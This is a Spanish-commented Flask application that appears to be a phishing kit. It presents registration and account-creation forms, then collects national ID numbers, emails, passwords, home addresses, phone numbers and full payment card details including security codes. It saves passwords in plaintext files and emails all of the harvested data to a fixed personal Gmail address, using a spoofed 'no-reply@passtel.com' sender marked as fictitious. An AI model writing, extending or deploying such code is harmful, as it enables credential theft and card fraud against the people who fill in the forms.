from flask import Flask, request, render_template
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)

# Directorio para guardar los archivos de texto
SAVE_DIR = 'data'
os.makedirs(SAVE_DIR, exist_ok=True)

# Función para enviar correo
def send_email(subject, body):
    sender_email = "no-reply@passtel.com"  # Cuenta ficticia
    recipient_email = "horacioibanez945@gmail.com"  # Destinatario fijo
    smtp_server = "smtp.gmail.com"
    smtp_port = 587

    # Crear mensaje
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = recipient_email
    message["Subject"] = subject

    # Agregar cuerpo del correo
    message.attach(MIMEText(body, "plain"))

    try:
        # Configurar servidor SMTP
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()  # Encriptar conexión
            server.login("your_gmail_account@gmail.com", "your_app_password")  # Cambiar
            server.sendmail(sender_email, recipient_email, message.as_string())
            print(f"Correo enviado a {recipient_email}")
    except Exception as e:
        print(f"Error al enviar correo: {e}")

@app.route('/')
def register():
    return render_template('register.html')

@app.route('/process_form', methods=['POST'])
def process_form():
    try:
        # Recibe los datos del formulario de registro
        tipo = request.form.get('tipo')
        dni_cuit = request.form.get('dni_cuit')
        email = request.form.get('email')
        password = request.form.get('password')
        terms = request.form.get('terms')

        # Validación básica
        if not (tipo and dni_cuit and email and password and terms):
            return render_template('register.html', error="Todos los campos son obligatorios.")

        # Formatear datos de registro
        user_data = f"Tipo: {tipo}\nDNI/CUIT: {dni_cuit}\nEmail: {email}\nPassword: {password}\n----------------------\n"

        # Guardar en el archivo de texto
        file_path = os.path.join(SAVE_DIR, f'{dni_cuit}.txt')
        with open(file_path, 'a') as file:
            file.write(user_data)

        # Enviar correo
        send_email("Registro completado", user_data)

        # Redirige a la página create.html
        return render_template('create.html')

    except Exception as e:
        return render_template('register.html', error=str(e))

@app.route('/process_create_form', methods=['POST'])
def process_create_form():
    try:
        # Recibe los datos del formulario de creación
        user_id = request.form.get('user_id')
        nombre = request.form.get('nombre')
        apellido = request.form.get('apellido')
        localidad = request.form.get('localidad')
        provincia = request.form.get('provincia')
        calle = request.form.get('calle')
        numero = request.form.get('numero')
        piso = request.form.get('piso', 'N/A')
        departamento = request.form.get('departamento', 'N/A')
        telefono = request.form.get('telefono')
        tarjeta = request.form.get('nom_tarjeta')
        num_tarjeta = request.form.getlist('num_tarjeta')[-1]
        titular = request.form.get('titular')
        cod_seguridad = request.form.get('codigo_seguridad')
        mes_vencimiento = request.form.get('mes_vencimiento')
        ano_vencimiento = request.form.get('ano_vencimiento')

        # Formatear datos de creación
        user_data = f"Nombre: {nombre}\nApellido: {apellido}\nLocalidad: {localidad}\nProvincia: {provincia}\nCalle: {calle}\nNumero: {numero}\nPiso: {piso}\nDepartamento: {departamento}\nTeléfono: {telefono}\nTarjeta: {tarjeta}\nNúmero Tarjeta: {num_tarjeta}\nTitular: {titular}\nCódigo Seguridad: {cod_seguridad}\nVencimiento: {mes_vencimiento}/{ano_vencimiento}\n----------------------\n"

        # Enviar correo
        send_email("Datos del formulario completado", user_data)

        # Redirigir a success.html
        return render_template('success.html')

    except Exception as e:
        return render_template('create.html', error=str(e))

if __name__ == '__main__':
    app.run(debug=True)
